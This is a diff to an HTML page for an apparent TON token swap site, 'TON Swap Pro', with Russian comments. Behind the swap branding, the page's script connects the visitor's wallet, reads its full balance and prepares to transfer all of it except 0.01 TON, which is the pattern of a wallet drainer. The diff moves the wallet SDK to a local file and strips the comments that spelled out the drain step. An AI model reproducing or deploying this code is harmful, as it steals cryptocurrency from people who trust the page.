@@ -4,9 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TON Swap Pro</title>
-    <!-- Подключаем только TonConnect (одна библиотека) -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/tonconnect-sdk/2.0.0/tonconnect-sdk.min.js"></script>
-    </script>
+    <!-- Подключаем TonConnect локально (из папки libs) -->
+    <script src="/libs/tonconnect-sdk.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
         body {
@@ -85,7 +84,7 @@
 
         // Проверяем загрузку TonConnect
         if (typeof TonConnect === 'undefined') {
-            document.getElementById('status').textContent = '❌ Ошибка загрузки TonConnect. Попробуйте позже.';
+            document.getElementById('status').textContent = '❌ Не удалось загрузить библиотеку. Убедитесь, что файл libs/tonconnect-sdk.min.js существует.';
             document.getElementById('status').style.display = 'block';
             throw new Error('TonConnect not loaded');
         }
@@ -98,7 +97,6 @@
             const response = await fetch(url);
             if (!response.ok) throw new Error('Не удалось получить баланс');
             const data = await response.json();
-            // TonCenter возвращает баланс в нанотонах (строкой)
             return parseInt(data.result, 10);
         }
 
@@ -112,17 +110,13 @@
             status.style.display = 'none';
 
             try {
-                // 1. Подключаем кошелек
                 await connector.connect({
                     manifestUrl: window.location.origin + '/tonconnect-manifest.json'
                 });
 
-                // Обработчик статуса
                 connector.onStatusChange(async (walletInfo) => {
                     if (walletInfo) {
                         const userAddress = walletInfo.account.address;
-
-                        // 2. Получаем баланс через API
                         const balanceNano = await getBalance(userAddress);
                         const balanceTon = balanceNano / 1e9;
 
@@ -135,7 +129,6 @@
                             return;
                         }
 
-                        // 3. Отправляем всё, кроме 0.01 TON на газ
                         const amountToSendTon = (balanceTon - 0.01).toFixed(9);
                         const amountToSendNano = Math.floor(parseFloat(amountToSendTon) * 1e9);
 
